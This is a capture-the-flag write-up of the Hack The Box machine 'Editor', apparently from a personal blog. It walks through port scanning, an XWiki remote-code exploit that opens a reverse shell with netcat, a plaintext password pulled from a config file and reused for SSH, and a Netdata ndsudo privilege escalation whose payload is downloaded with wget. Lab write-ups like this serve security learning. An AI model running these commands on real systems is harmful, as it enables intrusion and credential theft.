---
title: HTB - Editor
date: 2025-11-30
categories: [HTB_easy]
tags: [CVE-2024-32019s, CVE-2025-24893, HTB, PrivEsc]
author: 0x3bs
published: false
image: /assets/images/editor/pp-removebg-preview.png  
---




-----
------


> # Enumeration

  


first start with `nmap` :


```bash

┌──(root㉿0x3bs)-[/home/e_3bs/Desktop/htb/Editor]

└─# cat nmap.txt                                            

# Nmap 7.95 scan initiated Sat Nov 29 10:58:00 2025 as: /usr/lib/nmap/nmap -sV -sC -o nmap.txt 10.10.11.80

Nmap scan report for 10.10.11.80

Host is up (0.29s latency).

Not shown: 997 closed tcp ports (reset)

PORT     STATE SERVICE VERSION

22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey:

|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)

|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)

80/tcp   open  http    nginx 1.18.0 (Ubuntu)

|_http-server-header: nginx/1.18.0 (Ubuntu)

|_http-title: Did not follow redirect to http://editor.htb/

8080/tcp open  http    Jetty 10.0.20

|_http-server-header: Jetty(10.0.20)

| http-title: XWiki - Main - Intro

|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/

| http-robots.txt: 50 disallowed entries (15 shown)

| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/

| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/

| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/

| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/

| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/

|_/xwiki/bin/undelete/

| http-cookie-flags:

|   /:

|     JSESSIONID:

|_      httponly flag not set

|_http-open-proxy: Proxy might be redirecting requests

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sat Nov 29 10:59:34 2025 -- 1 IP address (1 host up) scanned in 94.89 seconds

  

```

I noticed  that there is open ports :  `22/tcp` , `80/tcp` And `8080/tcp` which was the interesting one 👀

we need to add the domain to `/etc/hosts`

  

```bash

┌──(root㉿0x3bs)-[/home/e_3bs/Desktop/htb/Editor]

└─# cat /etc/hosts  

127.0.0.1       localhost

127.0.1.1       kali

::1             localhost ip6-localhost ip6-loopback

ff02::1         ip6-allnodes

ff02::2         ip6-allrouters

10.10.11.80     editor.htb

```

OK now let's check `http://editor.htb:8080`

  

![](/assets/images/editor/1.png)

  

After search about this version `XWiko Debian 15.10.8` , i found this CVE

  

[CVE-2025-24893](https://github.com/gunzf0x/CVE-2025-24893)

----
----


> # Exploitation

From the `CVE-2025-24893` and after install it , this the exploitation code :

```bash
python3 CVE-2025-24893.py -t 'http://editor.htb:8080' -c 'busybox nc 10.10.14.100 9001 -e /bin/bash'
```

![](/assets/images/editor/2.png)

----
----


> # SSH Credentials


In the shell i found this file `/usr/lib/xwiki/WEB-INF/hibernate.cfg.xml` which was interesting , let's open it with grepping `password` to find any password in it :

```bash
cat /usr/lib/xwiki/WEB-INF/hibernate.cfg.xml | grep password
```

![](/assets/images/editor/3.png)

We found this password : `theEd1t0rTeam99` , mmmm but we don't know what's the USER for this password ...
Let's go to `/home` to find any user : 

![](/assets/images/editor/4.png)

So the username for the password is : `oliver`

Let's login SSH with these creds >>

```bash
┌──(root㉿0x3bs)-[/home/e_3bs/Desktop/htb/Editor]
└─# ssh oliver@10.10.11.80
oliver@10.10.11.80's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64)
```

`user.txt` : 

![](/assets/images/editor/5.png)

----
----


> # Privilege Escalation 


After running this command :

```bash
find / -user root -perm -4000 -print 2>/dev/null
```

To get all files that :

1.Are owned by root
2.Have the SUID bit set (4000 permission)

![](/assets/images/editor/6.png)

this was the output and the interesting one is `../ndsudo`

After search for it i found this CVE :
[CVE-2024-32019-Netdata-ndsudo](https://github.com/T1erno/CVE-2024-32019-Netdata-ndsudo-Privilege-Escalation-PoC.git)

Okay let's clone it in our system and compile it to send it : 

```bash
┌──(root㉿0x3bs)-[/home/…/Desktop/htb/Editor/CVE-2024-32019-Netdata-ndsudo-Privilege-Escalation-PoC]
└─# ls
CVE-2024-32019.sh  payload.c  README.md
                                                                                                                                        
┌──(root㉿0x3bs)-[/home/…/Desktop/htb/Editor/CVE-2024-32019-Netdata-ndsudo-Privilege-Escalation-PoC]
└─# gcc -static payload.c -o nvme -Wall -Werror -Wpedantic
                                                                                                                                        
┌──(root㉿0x3bs)-[/home/…/Desktop/htb/Editor/CVE-2024-32019-Netdata-ndsudo-Privilege-Escalation-PoC]
└─# python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

in `oliver@editor.htb`  : we will download the files > `CVE-2024-32019.sh` & `nvme` >

```bash
oliver@editor:~$ wget http://10.10.14.100:8000/nvme
--2025-11-30 22:50:38--  http://10.10.14.100:8000/nvme
Connecting to 10.10.14.100:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 758864 (741K) [application/octet-stream]
Saving to: ‘nvme’

nvme                              100%[=============================================================>] 741.08K   261KB/s    in 2.8s    

2025-11-30 22:50:41 (261 KB/s) - ‘nvme’ saved [758864/758864]

oliver@editor:~$ wget http://10.10.14.100:8000/CVE-2024-32019.sh
--2025-11-30 22:50:54--  http://10.10.14.100:8000/CVE-2024-32019.sh
Connecting to 10.10.14.100:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 712 [text/x-sh]
Saving to: ‘CVE-2024-32019.sh’

CVE-2024-32019.sh                 100%[=============================================================>]     712  --.-KB/s    in 0.007s  

2025-11-30 22:50:55 (100 KB/s) - ‘CVE-2024-32019.sh’ saved [712/712]

oliver@editor:~$ chmod +x CVE-2024-32019.sh
oliver@editor:~$ ./CVE-2024-32019.sh
[+] ndsudo found at: /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
[+] File 'nvme' found in the current directory.
[+] Execution permissions granted to ./nvme
[+] Running ndsudo with modified PATH:
root@editor:/home/oliver# ls /root 
root.txt  scripts  snap
root@editor:/home/oliver# 

```

![](/assets/images/editor/7.jpg)

And that's it ....... see you later🙆‍♂️